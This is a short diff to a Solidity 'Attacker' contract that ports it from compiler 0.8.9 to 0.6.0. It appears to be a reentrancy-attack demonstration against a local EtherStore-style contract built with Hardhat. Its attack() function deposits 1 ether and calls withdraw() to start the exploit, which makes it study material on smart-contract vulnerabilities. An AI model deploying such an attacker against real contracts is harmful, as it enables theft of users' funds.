@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.9;
+pragma solidity ^0.6.0;
 
 import './Reentrant.sol';
 import 'hardhat/console.sol';
@@ -7,7 +7,7 @@ import 'hardhat/console.sol';
 contract Attacker {
 Reentrant public reentrant;
 
-    constructor(address _etherStoreAddress) {
+    constructor(address _etherStoreAddress) public {
         reentrant = Reentrant(_etherStoreAddress);
     }
 
@@ -22,7 +22,7 @@ Reentrant public reentrant;
 
     function attack() external payable {
         require(this.getBalance() >= 1 ether, 'need to send at least 1 ether');
-        reentrant.deposit{value: 1 ether}();
+        reentrant.deposit.value(1 ether)();
         reentrant.withdraw();
     }
 
